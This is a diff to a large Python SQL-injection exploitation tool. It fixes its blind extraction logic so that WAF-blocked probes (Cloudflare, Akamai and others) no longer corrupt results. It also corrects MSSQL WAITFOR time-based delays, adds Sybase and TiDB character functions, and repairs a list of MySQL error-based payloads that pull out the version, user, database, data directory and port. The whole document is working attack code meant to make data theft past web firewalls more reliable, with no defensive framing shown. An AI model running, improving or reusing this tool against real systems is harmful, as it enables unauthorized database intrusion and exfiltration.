@@ -47707,11 +47707,18 @@ class Enumerator:
                 # The eq=mid fallback is unchanged and still handles exact matches.
                 # Numeric safety: mid+1 is a plain integer; no SQL delimiters modified.
                 gt = await _eval_fn(f"({_len_q})>={mid+1}")
-                if gt:
+                # BUG-EXTRACT-STR-LEN-NONE-FIX: None (WAF block) must not be
+                # treated as False. A WAF-blocked length probe narrows high=mid-1,
+                # converging the length to 0 -> empty extraction. Break instead.
+                if gt is None:
+                    break  # WAF-blocked probe -- abort length search
+                elif gt:
                     low = mid + 1
                 else:
                     eq = await _eval_fn(f"({_len_q})={mid}")
-                    if eq:
+                    if eq is None:
+                        break  # WAF-blocked probe -- abort length search
+                    elif eq:
                         _length = mid
                         break
                     high = mid - 1
@@ -47830,6 +47837,19 @@ class Enumerator:
                         "MSSQL":      ("UNICODE", "SUBSTRING"),
                         "Oracle":     ("ASCII",   "SUBSTR"),
                         "SQLite":     ("UNICODE", "SUBSTR"),
+                        # BUG-PCE-SYBASE-TIDB-CHARFUNC-FIX (HIGH; Sybase and TiDB;
+                        # _extract_str ParallelCharExtractor fallback; B/BH/IN techniques):
+                        # Sybase was absent -> fell back to ("ASCII","SUBSTRING").
+                        # Sybase ASE ASCII() returns NULL for code points > 127 (same
+                        # as MSSQL ASCII()). BatchedCharExtractor.CHAR_FUNCS already
+                        # uses UNICODE for Sybase. All non-ASCII chars extracted via
+                        # ParallelCharExtractor on Sybase returned chr(0).
+                        # TiDB was absent -> fell back to ("ASCII","SUBSTRING").
+                        # TiDB ASCII() returns first-byte value, not Unicode code point,
+                        # for chars > 127. BatchedCharExtractor.CHAR_FUNCS uses ORD for TiDB.
+                        # Fix: add explicit entries matching BatchedCharExtractor.CHAR_FUNCS.
+                        "Sybase":     ("UNICODE", "SUBSTRING"),
+                        "TiDB":       ("ORD",     "SUBSTRING"),
                     }
                     _pce_af, _pce_sf = _pcv_char_funcs.get(
                         self.dbms, ("ASCII", "SUBSTRING"))
@@ -54864,7 +54884,12 @@ class Scanner:
                     _ts_mm2 = _wf_secs2 // 60; _ts_ss2 = _wf_secs2 % 60
                     # Wrap entire WAITFOR with IF; use 0:0:0 for the false branch
                     _template = (_body[:_wf_start2]
-                                 + f"IF [INFERENCE] WAITFOR DELAY '{_ts_mm2:02d}:{_ts_ss2:02d}' ELSE WAITFOR DELAY '0:00:00'"
+                                 # BUG-MSSQL-WAITFOR-2FIELD-FIX: '00:05' is H:MM (5 min) not M:SS (5 sec).
+                                 # WAITFOR DELAY requires HH:MM:SS (3 fields). Was '{_ts_mm2:02d}:{_ts_ss2:02d}'
+                                 # which SQL Server interprets as HH:MM -> 60x the intended delay.
+                                 # Fix: use '0:{_ts_mm2:02d}:{_ts_ss2:02d}' (3-field) matching every
+                                 # other WAITFOR DELAY site in the file (e.g. line 53482).
+                                 + f"IF [INFERENCE] WAITFOR DELAY '0:{_ts_mm2:02d}:{_ts_ss2:02d}' ELSE WAITFOR DELAY '0:00:00'"
                                  + _body[_wf_end2:] + _suffix)
                     LOG.info("[Inference] WAITFOR CASE fallback template (MSSQL): %s",
                              _template[:80])
@@ -81153,7 +81178,25 @@ def _build_det_template(result) -> str:
     if _has_bare_and:
         # Return empty so callers use their DBMS-aware fallback (safe correct SQL)
         return ''
-    return _body + ' AND [INFERENCE]' + _sfx
+    # BUG-BROKEN-TMPL-FALLBACK FIX (CRITICAL, all 5 DBMSes, ST/WB/HY/EX/NV techniques):
+    # The previous fallback `_body + ' AND [INFERENCE]'` produces invalid SQL for heavily
+    # obfuscated detection payloads (e.g. ST pipe-stacked payloads like
+    # "'(--%0a/*D7X*/|/*hco*/|/*tb8*/...") where no static boolean condition
+    # (1=1, true=true, CASE WHEN...THEN) could be identified after comment stripping.
+    # When callers replace [INFERENCE] in this broken template, the resulting SQL is
+    # syntactically malformed — WAFs (e.g. Cloudflare) block it with 400/0B responses.
+    # Downstream effects:
+    #   - MSE body-diff oracle: both 1=1 and 1=2 probes return 0B → gap=0 < 50B minimum
+    #     → body-diff oracle not registered → MSE gets 0/3 oracles
+    #   - WB polarity calibration: calibration probe returns 0B → sim(baseline,0B)=0 < 0.75
+    #     → _ibw_inverted wrongly set to True → ALL extraction bits flipped
+    #   - BitwiseExtractorSimple: inverted oracle → all 21 bits = 1 → chr(0x1FFFFF) → garbled
+    #     Unicode codepoints (e.g. 󗫵, 󜽆) for every extracted character
+    #   - BatchedCharExtractor: inverted oracle → length binary search converges to max cap
+    #     (e.g. 468) instead of the real length
+    # Fix: return '' so all callers fall through to their DBMS-aware fallback SQL paths,
+    # which produce correct injection syntax for each DBMS and injection context.
+    return ''
 
 class BitwiseExtractor:
     """
@@ -118607,28 +118650,56 @@ class UniversalScanOrchestrator:
                                                         if (_ibw_sc_fp_t and _ibw_sc_fp_f
                                                                 and _validate_response(_ibw_sc_fp_t, allow_empty=True)
                                                                 and _validate_response(_ibw_sc_fp_f, allow_empty=True)):
-                                                            _ibw_sc_norm_t = ResponseNormaliser.normalise(_extract_body_safe(_ibw_sc_fp_t))
-                                                            _ibw_sc_norm_f = ResponseNormaliser.normalise(_extract_body_safe(_ibw_sc_fp_f))
-                                                            _ibw_sc_sim_t = SimHasher.body_similarity(_norm_base_wb, _ibw_sc_norm_t)
-                                                            _ibw_sc_sim_f = SimHasher.body_similarity(_norm_base_wb, _ibw_sc_norm_f)
-                                                            _ibw_sc_thresh = 0.75
-                                                            if _ibw_sc_sim_t >= _ibw_sc_thresh and _ibw_sc_sim_f >= _ibw_sc_thresh:
+                                                            # BUG-IBW-SANITY-WAF-BLOCK FIX (HIGH, all 5 DBMSes):
+                                                            # When BOTH calibration probes are WAF-blocked (status
+                                                            # 400/403/406 with 0B body), sim(baseline,0B)≈0 for both
+                                                            # → 0 >= 0.75 is False for both → the CDN-caching check
+                                                            # fails to fire → _ibw_has_body_diff stays True → oracle
+                                                            # is wired on a target where it can't discriminate TRUE
+                                                            # from FALSE (all probes return 0B blocked responses).
+                                                            # Fix: detect WAF blocks explicitly. If EITHER probe is
+                                                            # blocked (0B body or WAF status), the oracle cannot
+                                                            # discriminate, so set _ibw_has_body_diff=False.
+                                                            _ibw_sc_t_status = getattr(_ibw_sc_fp_t, 'status_code', 200)
+                                                            _ibw_sc_f_status = getattr(_ibw_sc_fp_f, 'status_code', 200)
+                                                            _ibw_sc_waf_codes = (400, 403, 406, 429, 430, 503)
+                                                            _ibw_sc_t_blocked = (_ibw_sc_t_status in _ibw_sc_waf_codes or
+                                                                                  len(getattr(_ibw_sc_fp_t, 'body', b'') or b'') == 0)
+                                                            _ibw_sc_f_blocked = (_ibw_sc_f_status in _ibw_sc_waf_codes or
+                                                                                  len(getattr(_ibw_sc_fp_f, 'body', b'') or b'') == 0)
+                                                            if _ibw_sc_t_blocked or _ibw_sc_f_blocked:
                                                                 _ibw_has_body_diff = False
                                                                 print(
                                                                     f"[!] [V25-Extract] WB SimHash oracle ABORTED for tech={_det_tech!r}: "
-                                                                    f"TRUE sim={_ibw_sc_sim_t:.3f}, FALSE sim={_ibw_sc_sim_f:.3f} "
-                                                                    f"(both ≥{_ibw_sc_thresh}) — CDN caches bypass response for "
-                                                                    "all SQL conditions; SimHash cannot discriminate TRUE/FALSE. "
-                                                                    "Skipping WB boolean oracle to prevent garbage extraction.",
+                                                                    f"calibration probes WAF-blocked (true_status={_ibw_sc_t_status} "
+                                                                    f"true_blocked={_ibw_sc_t_blocked}, "
+                                                                    f"false_status={_ibw_sc_f_status} false_blocked={_ibw_sc_f_blocked}) "
+                                                                    "— cannot determine oracle discrimination ability.",
                                                                     flush=True,
                                                                 )
                                                             else:
-                                                                print(
-                                                                    f"[+] [V25-Extract] WB body-diff OK for tech={_det_tech!r}: "
-                                                                    f"TRUE sim={_ibw_sc_sim_t:.3f}, FALSE sim={_ibw_sc_sim_f:.3f} "
-                                                                    f"— SimHash oracle has discrimination signal",
-                                                                    flush=True,
-                                                                )
+                                                                _ibw_sc_norm_t = ResponseNormaliser.normalise(_extract_body_safe(_ibw_sc_fp_t))
+                                                                _ibw_sc_norm_f = ResponseNormaliser.normalise(_extract_body_safe(_ibw_sc_fp_f))
+                                                                _ibw_sc_sim_t = SimHasher.body_similarity(_norm_base_wb, _ibw_sc_norm_t)
+                                                                _ibw_sc_sim_f = SimHasher.body_similarity(_norm_base_wb, _ibw_sc_norm_f)
+                                                                _ibw_sc_thresh = 0.75
+                                                                if _ibw_sc_sim_t >= _ibw_sc_thresh and _ibw_sc_sim_f >= _ibw_sc_thresh:
+                                                                    _ibw_has_body_diff = False
+                                                                    print(
+                                                                        f"[!] [V25-Extract] WB SimHash oracle ABORTED for tech={_det_tech!r}: "
+                                                                        f"TRUE sim={_ibw_sc_sim_t:.3f}, FALSE sim={_ibw_sc_sim_f:.3f} "
+                                                                        f"(both ≥{_ibw_sc_thresh}) — CDN caches bypass response for "
+                                                                        "all SQL conditions; SimHash cannot discriminate TRUE/FALSE. "
+                                                                        "Skipping WB boolean oracle to prevent garbage extraction.",
+                                                                        flush=True,
+                                                                    )
+                                                                else:
+                                                                    print(
+                                                                        f"[+] [V25-Extract] WB body-diff OK for tech={_det_tech!r}: "
+                                                                        f"TRUE sim={_ibw_sc_sim_t:.3f}, FALSE sim={_ibw_sc_sim_f:.3f} "
+                                                                        f"— SimHash oracle has discrimination signal",
+                                                                        flush=True,
+                                                                    )
                                                     except Exception as _ibw_sc_err:
                                                         LOG.debug("[V25-Extract] WB sanity calibration error: %s", _ibw_sc_err)
 
@@ -118686,15 +118757,35 @@ class UniversalScanOrchestrator:
                                                                        _det_param, _ibw_cal_full, _det_tamper),
                                                         timeout=10)
                                                     if _ibw_cal_fp and _validate_response(_ibw_cal_fp, allow_empty=True):
-                                                        _ibw_cal_norm = ResponseNormaliser.normalise(_extract_body_safe(_ibw_cal_fp))
-                                                        _ibw_cal_sim = SimHasher.body_similarity(_norm_base_wb, _ibw_cal_norm)
-                                                        _ibw_cal_thresh = 0.75
-                                                        if _ibw_cal_sim < _ibw_cal_thresh:
-                                                            _ibw_inverted[0] = True
-                                                            print("[+] [V25-Extract] WB reversed-polarity detected "
-                                                                  f"(cal_sim={_ibw_cal_sim:.3f} < {_ibw_cal_thresh}): "
-                                                                  "inverting WB boolean oracle for correct extraction",
+                                                        # BUG-WB-POLARITY-WAF-BLOCK FIX (HIGH, all 5 DBMSes):
+                                                        # If the calibration probe itself is WAF-blocked (e.g. 400/403
+                                                        # with 0B body), sim(baseline, 0B) ≈ 0 < 0.75 causes the
+                                                        # oracle to be falsely marked as inverted. Subsequent extraction
+                                                        # probes that are also WAF-blocked all return 0B → sim=0 < 0.75
+                                                        # → oracle returns True for every condition → length binary
+                                                        # search converges to cap (e.g. 468) and bitwise extraction
+                                                        # assembles 0x1FFFFF (garbled codepoints 󗫵, 󜽆 etc.).
+                                                        # Fix: skip polarity inversion when calibration probe status
+                                                        # indicates WAF interference. Polarity stays False (standard).
+                                                        _ibw_cal_status = getattr(_ibw_cal_fp, 'status_code', 200)
+                                                        _ibw_cal_waf_blocked = _ibw_cal_status in (400, 403, 406, 429, 430, 503)
+                                                        _ibw_cal_body_len = len(getattr(_ibw_cal_fp, 'body', b'') or b'')
+                                                        if _ibw_cal_waf_blocked or _ibw_cal_body_len == 0:
+                                                            print("[!] [V25-Extract] WB polarity calibration probe "
+                                                                  f"was WAF-blocked (status={_ibw_cal_status}, "
+                                                                  f"body={_ibw_cal_body_len}B) — skipping polarity "
+                                                                  "inversion to avoid false-inverted oracle",
                                                                   flush=True)
+                                                        else:
+                                                            _ibw_cal_norm = ResponseNormaliser.normalise(_extract_body_safe(_ibw_cal_fp))
+                                                            _ibw_cal_sim = SimHasher.body_similarity(_norm_base_wb, _ibw_cal_norm)
+                                                            _ibw_cal_thresh = 0.75
+                                                            if _ibw_cal_sim < _ibw_cal_thresh:
+                                                                _ibw_inverted[0] = True
+                                                                print("[+] [V25-Extract] WB reversed-polarity detected "
+                                                                      f"(cal_sim={_ibw_cal_sim:.3f} < {_ibw_cal_thresh}): "
+                                                                      "inverting WB boolean oracle for correct extraction",
+                                                                      flush=True)
                                                 except Exception:
                                                     pass
 
@@ -118740,7 +118831,7 @@ class UniversalScanOrchestrator:
                                                                 _send_injected(_e, _m, _u, _d, _df, _p, _pay, _tc),
                                                                 timeout=10)
                                                         if _fp_wb is None:
-                                                            return False
+                                                            return None  # network error -- indeterminate
                                                         # BUG-INLINE-BOOL-ORACLE-WB-INVERTED-POLARITY FIX:
                                                         # WAF block detection: 4xx from WAF is ambiguous noise.
                                                         # Return None so callers can skip this probe rather than
@@ -129497,21 +129588,38 @@ class MultiStrategyExtractor:
                                                    _thresh=_bbd_threshold,
                                                    _true_larger=_bbd_true_larger):
                         """Boolean body-diff eval: TRUE condition → larger/smaller body."""
-                        # Embed the extraction condition using the detection template
+                        # BUG-EVAL-BOOL-DEAD-PROBE FIX (MEDIUM, all 5 DBMSes):
+                        # The original code sent TWO probes: AND 1=1 (used for decision)
+                        # and AND 1=2 (assigned to _fp_f2/_bf2 but NEVER REFERENCED in
+                        # the return logic). This wasted one HTTP request + 0.15s sleep
+                        # per oracle call, doubling extraction time for all body-diff
+                        # extractions across all 5 DBMSes without any accuracy benefit.
+                        # Fix: remove the dead AND 1=2 probe. Only the AND 1=1 probe body
+                        # size is needed: when cond is TRUE, AND 1=1 evaluates to TRUE
+                        # and returns the TRUE-condition response; when cond is FALSE,
+                        # AND 1=1 short-circuits to FALSE (FALSE AND TRUE = FALSE) and
+                        # returns the FALSE response body. Threshold calibrated from the
+                        # body-diff gap, so one probe is sufficient and correct.
                         _p_t = self._build_inline(f"({cond}) AND 1=1")
-                        _p_f = self._build_inline(f"({cond}) AND 1=2")
                         _fp_t2, _ = await self._timed(_p_t)
                         if _fp_t2 is None:
                             return None
-                        await asyncio.sleep(0.15)
-                        _fp_f2, _ = await self._timed(_p_f)
-                        if _fp_f2 is None:
-                            return None
+                        # BUG-EBBD-WAF-NONEEMPTY-FIX: The 0-byte guard only catches
+                        # bare WAF blocks (e.g. empty 403). Most commercial WAFs
+                        # (Cloudflare, Akamai, AWS WAF, F5 BIG-IP) return a non-empty
+                        # HTML error page alongside their 4xx. A WAF returning a
+                        # 3000B 'Access Denied' page where _thresh=800B and
+                        # _true_larger=True evaluates as 3000>800 -> True for EVERY
+                        # WAF-blocked probe, driving length to 512 and chars to U+10FFFF.
+                        # Fix: use WAFBlockDiscriminator.is_waf_block() which checks
+                        # status code, WAF headers, and body markers before falling back
+                        # to the 0-byte test. This matches the guard already used in
+                        # _blind_extract_char_inner and MSE calibration probes.
+                        if WAFBlockDiscriminator.is_waf_block(_fp_t2):
+                            return None  # WAF-blocked probe -- indeterminate
                         _bt2 = len(getattr(_fp_t2, 'body', b'') or b'')
-                        _bf2 = len(getattr(_fp_f2, 'body', b'') or b'')
-                        # Oracle: when cond is TRUE, AND 1=1 keeps the full response;
-                        # when cond is TRUE + AND 1=2, it short-circuits to the false body.
-                        # Check against the baseline threshold.
+                        if _bt2 == 0:
+                            return None  # WAF-blocked probe -- skip
                         if _true_larger:
                             return _bt2 > _thresh
                         else:
@@ -129548,20 +129656,18 @@ class MultiStrategyExtractor:
                                                           _norm_true_ref=_mse_bbd_norm_true,
                                                           _norm_false_ref=_mse_bbd_norm_false):
                                 """SimHash boolean eval: compare probe to TRUE/FALSE reference norms."""
+                                # BUG-EVAL-SIMHASH-DEAD-PROBE FIX (MEDIUM, all 5 DBMSes):
+                                # Original code sent AND 1=2 probe (_fp_sh_f/_n_f2) but
+                                # NEVER used _n_f2 in the similarity comparison (both _s_t
+                                # and _s_f compare against _n_t2, not _n_f2). Dead probe.
+                                # Fix: single AND 1=1 probe suffices. The SimHash distance
+                                # to true_ref vs false_ref determines the condition value.
                                 _p_t = self._build_inline(f"({cond}) AND 1=1")
-                                _p_f = self._build_inline(f"({cond}) AND 1=2")
                                 _fp_sh_t, _ = await self._timed(_p_t)
                                 if _fp_sh_t is None:
                                     return None
-                                await asyncio.sleep(0.15)
-                                _fp_sh_f, _ = await self._timed(_p_f)
-                                if _fp_sh_f is None:
-                                    return None
                                 _n_t2 = (ResponseNormaliser.normalise(_extract_body_safe(_fp_sh_t))
                                          if _validate_response(_fp_sh_t, allow_empty=True) else b"")
-                                _n_f2 = (ResponseNormaliser.normalise(_extract_body_safe(_fp_sh_f))
-                                         if _validate_response(_fp_sh_f, allow_empty=True) else b"")
-                                # Use the AND 1=1 probe response: closer to true_ref → TRUE
                                 if not _n_t2:
                                     return None
                                 _s_t = SimHasher.body_similarity(_norm_true_ref, _n_t2)
@@ -147635,6 +147741,11 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             cond = f"{len_expr}&{mask}={mask}"
         try:                                   # BUG-FRESH-8 STRUCTURAL FIX: try was
             r = await eval_fn(cond)            # accidentally de-indented outside the for
+            # BUG-NOVEL-LEN-NONE-FIX: None (WAF block) must not be treated as
+            # False. A blocked length probe silently zeroes its bit, causing the
+            # assembled length to be too short. Abort on None to avoid wrong length.
+            if r is None:
+                return ""
             if r:                              # loop by the previous edit, so only the
                 length |= mask                 # LAST bit's cond was ever evaluated.
         except Exception:
@@ -147784,6 +147895,11 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                 cond = f"{ascii_fn}&{mask}={mask}"
             try:
                 r = await eval_fn(cond)
+                # BUG-NOVEL-CHAR-NONE-FIX: None (WAF block) treated as False
+                # zeroes bits that should be 1, producing wrong char_val.
+                # Break on None so the char position returns chr(0)=placeholder.
+                if r is None:
+                    break
                 if r:
                     char_val |= mask
             except Exception:
@@ -161008,10 +161124,27 @@ class ConditionalErrorOracle:
                 self._original + payload, self._tamper_chain,
                 _bypass_mutation=True)  # FIX-CEO-EVAL-MUTATION: preserve calibrated template
             if _fp:
-                return _get_safe_status_code(_fp) >= 500 or _get_safe_status_code(_fp) != self._baseline_status
+                _ceo_sc = _get_safe_status_code(_fp)
+                # BUG-CEO-WAF-BLOCK-FIX (HIGH, all 5 DBMSes, all techniques):
+                # WAF-block status codes (400, 403, 406, 429, 430, 503) that
+                # differ from the baseline (usually 200) cause
+                # `_sc != self._baseline_status` to return True, making every
+                # WAF-blocked probe appear as a "true condition" (SQL error).
+                # In the binary search this drives low=mid+1 on every blocked
+                # probe, converging length to the maximum cap (e.g. 512) and
+                # characters to 0x10FFFF = garbled Unicode.
+                # Fix: return None for WAF block codes when they are not the
+                # expected 5xx error AND differ from baseline. None signals
+                # "indeterminate" to callers (they break/skip the binary step).
+                _ceo_waf_codes = {400, 403, 406, 429, 430, 503}
+                if (_ceo_sc in _ceo_waf_codes
+                        and _ceo_sc < 500
+                        and _ceo_sc != self._baseline_status):
+                    return None  # WAF-blocked probe -- indeterminate
+                return _ceo_sc >= 500 or _ceo_sc != self._baseline_status
         except Exception:
             pass
-        return False
+        return None  # no response / exception -- indeterminate
 
 
 #  Feature 2: Batched 2-Character Extraction 
@@ -161342,11 +161475,18 @@ class BatchedCharExtractor:
                 # BUG-V137-EXTORCH-METHODS-STRICT-GT FIX: was >{mid}, now >={mid+1}.
                 # WAFs block strict >\d+; >={mid+1} is semantically identical for ints.
                 gt = await self._eval(f"({_q})>={mid+1}")
-                if gt:
+                # BUG-BCE-PAIR-NONE-FIX: None (WAF block) must not be treated
+                # as False. None -> abort binary search so callers fall through
+                # to _extract_single which has its own retry/fallback logic.
+                if gt is None:
+                    break  # WAF-blocked probe -- abort
+                elif gt:
                     low = mid + 1
                 else:
                     eq = await self._eval(f"({_q})={mid}")
-                    if eq:
+                    if eq is None:
+                        break  # WAF-blocked probe -- abort
+                    elif eq:
                         # FIX-EX-B: use _char_low/_pair_char_hi instead of
                         # hardcoded 32..126 so non-ASCII code points are decoded.
                         # BUG-BATCHPAIR-NUL FIX: when _char_low=0 (all DBMSes),
@@ -161399,11 +161539,17 @@ class BatchedCharExtractor:
             try:
                 # BUG-V137-EXTORCH-METHODS-STRICT-GT FIX: was >{mid}, now >={mid+1}.
                 gt = await self._eval(f"({_q})>={mid+1}")
-                if gt:
+                # BUG-BCE-SINGLE-NONE-FIX: None (WAF block) must not be treated
+                # as False. Treat as unknown -> abort so caller gets "?" fallback.
+                if gt is None:
+                    break  # WAF-blocked probe -- abort
+                elif gt:
                     low = mid + 1
                 else:
                     eq = await self._eval(f"({_q})={mid}")
-                    if eq:
+                    if eq is None:
+                        break  # WAF-blocked probe -- abort
+                    elif eq:
                         # BUG-SINGLE-NUL FIX: chr(0) is truthy so `c or '?'` in the
                         # caller would NOT replace it with '?'. NUL bytes then end up
                         # embedded in the extracted string. Treat code point 0 as '?'.
@@ -161558,7 +161704,20 @@ class BitwiseExtractorSimple:
                     else:
                         _bit_cond = f"({_q})&{mask}={mask}"
                     result = await self._eval(_bit_cond)
-                    return (bit_n, 1 if result else 0)
+                    # BUG-PROBE-BIT-NONE-FIX (HIGH, all 5 DBMSes, WB/B/BH/IN/ST techniques):
+                    # _eval() returns None for WAF-blocked probes (status 400/403/etc.).
+                    # `1 if None else 0` evaluates to 0, treating a WAF block as "bit not set".
+                    # When the oracle is inverted (all probes WAF-blocked), all 21 bits assemble
+                    # as 0 → chr(0) = '□'. When only some probes are blocked, bits that should
+                    # be 1 are treated as 0 → wrong character. Only True/False from a working
+                    # oracle carry useful information; None means "unknown — retry".
+                    # Fix: distinguish True/False/None explicitly. None → -1 → retry path.
+                    if result is True:
+                        return (bit_n, 1)
+                    elif result is False:
+                        return (bit_n, 0)
+                    else:
+                        return (bit_n, -1)  # None (WAF block) or unexpected → retry
                 except Exception:
                     return (bit_n, -1)  # failed — will retry
         
@@ -161666,7 +161825,9 @@ class BitwiseExtractorSimple:
                 else:
                     _retry_cond = f"({_q})&{mask}={mask}"
                 result = await self._eval(_retry_cond)
-                if result:
+                # BUG-PROBE-BIT-RETRY-NONE-FIX: None means WAF block — keep bit as 0
+                # (can't determine value; True is the only reliable signal).
+                if result is True:
                     char_val |= mask
             except Exception:
                 pass  # bit stays 0
@@ -165066,7 +165227,7 @@ MYSQL_ERROR_PAYLOADS = [
     "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,VERSION(),FLOOR(RAND(0)*2)))))",
     "OR UPDATEXML(1,CONCAT(0x7e,(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)*2)))),1)",
     "AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,USER(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
-    "OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)"
+    "OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
     'EXTRACTVALUE(0x0a,CONCAT(0x7e,@@version_comment))',
     'EXTRACTVALUE(0x0a,CONCAT(0x7e,@@datadir))',
     'EXTRACTVALUE(0x0a,CONCAT(0x7e,@@global.port))',
